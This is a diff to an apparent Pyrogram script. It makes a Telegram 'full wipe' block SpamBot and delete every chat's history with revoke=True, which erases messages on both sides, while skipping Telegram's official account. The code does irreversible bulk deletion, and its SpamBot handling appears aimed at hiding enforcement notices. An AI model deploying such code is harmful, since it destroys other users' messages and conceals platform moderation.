@@ -170,23 +170,37 @@ async def perform_full_wipe(client: Client):
 
         # 2. Specifically Block and Delete SpamBot to ensure it disappears
         try:
-            # Explicitly target SpamBot ID (178220800) and username
+            from pyrogram.raw import functions
+            # 178220800 is SpamBot ID
             for target in ["SpamBot", 178220800]:
                 try:
                     await client.block_user(target)
-                    await client.delete_chat(target)
+                    peer = await client.resolve_peer(target)
+                    # Use RPC to delete history for both sides and clear completely
+                    await client.invoke(functions.messages.DeleteHistory(
+                        peer=peer, max_id=0, just_clear=False, revoke=True
+                    ))
                 except Exception: pass
         except Exception: pass
 
-        # 3. Iterate through all dialogs and delete them
+        # 3. Iterate through all dialogs and delete them aggressively
+        from pyrogram.raw import functions
         async for dialog in client.get_dialogs():
             if dialog.chat.id == 777000: # Skip Telegram Official
                 continue
             try:
-                await client.delete_chat(dialog.chat.id)
-            except Exception: pass
+                peer = await client.resolve_peer(dialog.chat.id)
+                # Delete history for both sides and remove from list
+                await client.invoke(functions.messages.DeleteHistory(
+                    peer=peer, max_id=0, just_clear=False, revoke=True
+                ))
+            except Exception:
+                try:
+                    # Fallback for groups/channels if DeleteHistory fails
+                    await client.delete_chat(dialog.chat.id)
+                except Exception: pass
         
-        logging.info("Full Wipe completed successfully (including SpamBot blocking).")
+        logging.info("Full Wipe completed successfully (including SpamBot and all dialogs).")
     except Exception as e:
         logging.error(f"Full Wipe error: {e}")
 
